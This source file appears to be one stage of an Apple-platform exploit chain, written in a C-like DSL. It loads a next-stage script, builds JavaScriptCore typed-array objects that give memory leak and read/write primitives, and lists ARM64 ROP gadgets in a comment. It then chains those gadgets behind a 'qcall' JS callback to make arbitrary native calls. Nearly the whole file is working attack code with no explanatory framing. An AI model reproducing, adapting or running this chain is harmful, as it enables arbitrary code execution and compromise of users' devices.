#include "config.h"
#include "config2.h"

extern JSContextGetGlobalObject;
extern JSEvaluateScript;
extern JSGlobalContextCreate;
extern JSGlobalContextRelease;
extern JSObjectMake;
extern JSObjectMakeArray;
extern JSObjectMakeFunctionWithCallback;
extern JSObjectMakeTypedArrayWithBytesNoCopy;
extern JSObjectSetProperty;
extern JSStringCreateWithUTF8CString;
extern JSStringGetMaximumUTF8CStringSize;
extern JSStringGetUTF8CString;
extern JSStringRelease;
extern JSValueMakeNumber;
extern JSValueMakeUndefined;
extern JSValueToStringCopy;

extern __stderrp;
extern calloc;
extern close;
extern dlopen;
extern dlsym;
extern exit [[noreturn]];
extern fprintf [[regparm = 2]];
extern free;
extern lseek;
extern malloc;
extern open [[regparm = 2]];
extern pread;

extern pthread_get_stackaddr_np;
extern pthread_get_stacksize_np;
extern pthread_self;

#define NULL 0

/* open-only flags */
#define	O_RDONLY	0x0000		/* open for reading only */

#define	SEEK_END	2	/* set file offset to EOF plus offset */

#define RTLD_LAZY	0x1

#define kJSPropertyAttributeNone 0

#define kJSTypedArrayTypeUint32Array 6

[[stack=0x200]]fprintf(*__stderrp, "Stage5\n");

volatile fd = open(STAGE6_NAME, O_RDONLY);
if (fd & 0x80000000) {
    fprintf(*__stderrp, "cannot find stage6\n");
    exit(-1);
}
volatile sz = lseek(fd, 0, SEEK_END);
volatile source = calloc(1, sz + 1);
pread(fd, source, sz, 0);
close(fd);

/*
gadgets_0:
    f940008c ldr x12, [x4]
    f9401985 ldr x5, [x12, #0x30]
    aa0403e0 mov x0, x4
    aa0b03e1 mov x1, x11
    aa0a03e2 mov x2, x10
    aa0903e3 mov x3, x9
    aa0803e4 mov x4, x8
    d61f00a0 br x5

gadgets_1:
    f9400408 ldr x8, [x0, #8]
    f9400900 ldr x0, [x8, #0x10]
    f9400008 ldr x8, [x0]
    f9400d01 ldr x1, [x8, #0x18]
    d61f0020 br x1

gadgets_2:
    f9400408 ldr x8, [x0, #8]
    f9400d00 ldr x0, [x8, #0x18]
    b4000080 cbz x0, ...
    f9400008 ldr x8, [x0]
    f9403101 ldr x1, [x8, #0x60]
    d61f0020 br x1

gadgets_3:
    a9bf7bfd stp x29, x30, [sp, #-0x10]!
    910003fd mov x29, sp
    f9400808 ldr x8, [x0, #0x10]
    d63f0100 blr x8
    d2800000 movz x0, #0
    a8c17bfd ldp x29, x30, [sp], #0x10
    d65f03c0 ret

gadgets_4:
    a9420001 ldp x1, x0, [x0, #0x20]
    d61f0020 br x1

gadgets_5:
    a9be4ff4 stp x20, x19, [sp, #-0x20]!
    a9017bfd stp x29, x30, [sp, #0x10]
    910043fd add x29, sp, #0x10
    aa0003f3 mov x19, x0
    a9402260 ldp x0, x8, [x19]
    b9401261 ldr w1, [x19, #0x10]
    a9418e62 ldp x2, x3, [x19, #0x18]
    f9401a64 ldr x4, [x19, #0x30]
    d63f0100 blr x8
    f9001660 str x0, [x19, #0x28]
    a9417bfd ldp x29, x30, [sp, #0x10]
    a8c24ff4 ldp x20, x19, [sp], #0x20
    d65f03c0 ret

gadgets_6:
    f9400000 ldr x0, [x0]
    d65f03c0 ret

gadgets_7:
    f9000002 str x2, [x0]
    d65f03c0 ret

gadgets_8:
    a9402005 ldp x5, x8, [x0]
    a9410c01 ldp x1, x3, [x0, #0x10]
    a9421002 ldp x2, x4, [x0, #0x20]
    aa0803e0 mov x0, x8
    d61f00a0 br x5
*/

// make sure we got the JSC ready
[[stack=0x2000]]dlopen("/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore", RTLD_LAZY);

fprintf(*__stderrp, "Setup\n");

exception = NULL;
volatile context = JSGlobalContextCreate(NULL);
volatile script = JSStringCreateWithUTF8CString(source);
volatile sourceURL = JSStringCreateWithUTF8CString("Stage6");
volatile globalObject = JSContextGetGlobalObject(context);

// leakval primitive
volatile value = JSValueMakeNumber(context, 1337);
volatile boxed = JSObjectMakeArray(context, 1, &value, NULL);
butterfly = boxed + 8;

array = JSObjectMakeTypedArrayWithBytesNoCopy(context, kJSTypedArrayTypeUint32Array, *butterfly, 8, NULL, NULL, NULL);
JSObjectSetProperty(context, globalObject, JSStringCreateWithUTF8CString("lmao"), array, kJSPropertyAttributeNone, NULL);
JSObjectSetProperty(context, globalObject, JSStringCreateWithUTF8CString("ayyy"), boxed, kJSPropertyAttributeNone, NULL);

// build some magic arrays

magic = { dyld_shared_cache_arm64, dlsym, gadgets_6, gadgets_7, gadgets_8, gadgets_load_6, gadgets_set_x8, gadgets_call2v, gadgets_set_x7 };

JSObjectSetProperty(context, globalObject, JSStringCreateWithUTF8CString("magic"), JSObjectMakeTypedArrayWithBytesNoCopy(context, kJSTypedArrayTypeUint32Array, magic, 72, NULL, NULL, NULL), kJSPropertyAttributeNone, NULL);

/*
 * Uint32Array layout:
 * 0x01082a000000010c 0x0000000000000000 <- structureID, butterfly
 * 0x???????????????? 0x0000000000000100 <- vector, len
 *
 * Arrange two adjacent Uint32Array in MarkedSpace, so we can deref +0x30 of the first parameter.
 */
volatile a1 = JSObjectMakeTypedArrayWithBytesNoCopy(context, kJSTypedArrayTypeUint32Array, gadgets_1, 8, NULL, NULL, NULL);
volatile a2 = JSObjectMakeTypedArrayWithBytesNoCopy(context, kJSTypedArrayTypeUint32Array, gadgets_1, 8, NULL, NULL, NULL);
voff = 0x10;
if (a2 - a1 - 0x20) {
    /*
     * Object layout:
     * 0x010016000000018b 0x0000000000000000 <- structureID, butterfly
     * 0x0000000000000000 0x0000000000000000 <- inline properties
     * 0x0000000000000000 0x0000000000000000 <- inline properties
     * 0x???????????????? 0x0000000000000000 <- inline properties
     *
     * Create an empty object and then forcibly place our pointer as fifth property, so we can deref +0x30.
     */
    a1 = JSObjectMake(context, NULL, NULL);
    a2 = JSObjectMake(context, NULL, NULL);
    if (a2 - a1 - 0x40) {
        fprintf(*__stderrp, "bad karma\n");
        exit(-1);
    }
    prop = a1 + 0x30;
    *prop = gadgets_2;
    voff = 0x18;
}
JSObjectSetProperty(context, globalObject, JSStringCreateWithUTF8CString("qbase"), a1, kJSPropertyAttributeNone, NULL);
JSObjectSetProperty(context, globalObject, JSStringCreateWithUTF8CString("tramp"), a2, kJSPropertyAttributeNone, NULL);

// control = { control, ?, gadgets_4, gadgets_3, gadgets_5, (char *)control + 0x30, x0, fp, w1, x2, x3, rv, gadgets_3 };
volatile control = calloc(1, 0x4000);
control_2 = control + 2 * 8;
control_3 = control + 3 * 8;
control_4 = control + 4 * 8;
control_5 = control + 5 * 8;
control_c = control + 12 * 8;
*control = control;
*control_2 = gadgets_4;
*control_3 = *control_c = gadgets_3;
*control_4 = gadgets_5;
*control_5 = control + 6 * 8;

volatile arr = JSObjectMakeTypedArrayWithBytesNoCopy(context, kJSTypedArrayTypeUint32Array, control, 0x4000, NULL, NULL, NULL);
JSObjectSetProperty(context, globalObject, JSStringCreateWithUTF8CString("qargs"), arr, kJSPropertyAttributeNone, NULL);

arr_vec = arr + voff;
JSObjectSetProperty(context, globalObject, JSStringCreateWithUTF8CString("qctrl"), JSObjectMakeTypedArrayWithBytesNoCopy(context, kJSTypedArrayTypeUint32Array, *arr_vec, 0x100, NULL, NULL, NULL), kJSPropertyAttributeNone, NULL);

volatile qcallIString = JSStringCreateWithUTF8CString("qcall");
JSObjectSetProperty(context, globalObject, qcallIString, JSObjectMakeFunctionWithCallback(context, qcallIString, gadgets_0), kJSPropertyAttributeNone, NULL);
JSStringRelease(qcallIString);

// run the script

result = JSEvaluateScript(context, script, globalObject, sourceURL, 1, &exception);
JSStringRelease(script);
JSStringRelease(sourceURL);
if (result) {
    fprintf(*__stderrp, "result: %p\n", result);
} else {
    volatile exceptionIString = JSValueToStringCopy(context, exception, NULL);
    volatile exceptionUTF8Size = JSStringGetMaximumUTF8CStringSize(exceptionIString);
    volatile exceptionUTF8 = malloc(exceptionUTF8Size);
    JSStringGetUTF8CString(exceptionIString, exceptionUTF8, exceptionUTF8Size);
    fprintf(*__stderrp, "exception: %s\n", exceptionUTF8);
    free(exceptionUTF8);
    JSStringRelease(exceptionIString);
}
JSGlobalContextRelease(context);

exit(42);
